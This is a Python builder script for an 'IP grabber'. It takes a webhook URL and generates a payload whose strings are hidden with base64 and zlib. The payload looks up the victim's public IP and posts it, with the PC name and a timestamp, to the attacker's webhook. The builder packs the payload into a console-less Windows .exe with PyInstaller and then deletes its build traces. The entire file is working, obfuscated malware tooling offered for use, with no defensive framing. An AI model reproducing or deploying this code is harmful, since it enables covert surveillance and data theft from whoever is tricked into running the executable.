import os
import shutil
import base64
import zlib

def generate_obfuscated_code(webhook):
    def b64zip(s):
        """Compress string and encode as base64"""
        return base64.b64encode(zlib.compress(s.encode())).decode()

    def b64(s):
        """Base64 encode a string"""
        return base64.b64encode(s.encode()).decode()

    
    webhook_encoded = b64zip(webhook)
    ip_url_encoded = b64zip("https://api.ipify.org")

    # Message parts (encoded in base64)
    msg_title = b64("IP Grabbed!")
    msg_ip = b64("IP Address:")
    msg_pc = b64("PC Name:")
    msg_time = b64("Timestamp:")

    
    return f'''
import base64 as b, zlib as z, datetime as d, platform as p, requests as r


def _u(x): return z.decompress(b.b64decode(x)).decode()
def _t(x): return b.b64decode(x).decode()


_w = _u("{webhook_encoded}")
_i = _u("{ip_url_encoded}")


_m1 = _t("{msg_title}")
_m2 = _t("{msg_ip}")
_m3 = _t("{msg_pc}")
_m4 = _t("{msg_time}")


def g():
    try: return r.get(_i, timeout=5).text
    except: return "x.x.x.x"

def j():
    return {{
        "content": f"{{_m1}}\\n{{_m2}} `{{g()}}`\\n{{_m3}} `{{p.node()}}`\\n{{_m4}} `{{d.datetime.now()}}`"
    }}


def s():
    try: r.post(_w, json=j(), timeout=5)
    except: pass

if __name__ == "__main__":
    s()
'''

def clean_filename(name):
    """Clean up the filename to make it valid and safe"""
    return "".join(c for c in name if c.isalnum() or c in (' ', '-', '_'))

def main():
    webhook = input("Enter Webhook URL: ").strip()
    if not webhook:
        print("❌ Webhook is required.")
        return

    filename = input("Enter file name (without .py): ").strip()
    filename = clean_filename(filename) or "CreateGrabber"

    py_file = f"{filename}.py"

    try:
        # Write the obfuscated code to the .py file
        with open(py_file, "w", encoding="utf-8") as f:
            f.write(generate_obfuscated_code(webhook))
    except Exception as e:
        print(f"❌ Failed to write file: {e}")
        return

    print(f"⚙️ Building the .exe with filename {filename}.exe...")

    # Use PyInstaller to build the .exe
    os.system(f'pyinstaller --onefile --noconsole --name "{filename}" "{py_file}"')

    # Path of the generated .exe
    exe_path = f"dist/{filename}.exe"
    if os.path.exists(exe_path):
        shutil.move(exe_path, f"./{filename}.exe")
    else:
        print("❌ Build failed: .exe not found.")
        return

    # Clean up build artifacts
    for folder in ["build", "dist"]:
        shutil.rmtree(folder, ignore_errors=True)

    for ext in [".spec", ".py"]:
        try:
            os.remove(f"{filename}{ext}")
        except FileNotFoundError:
            pass

    print(f"✔️ {filename}.exe successfully created!")

if __name__ == "__main__":
    main()
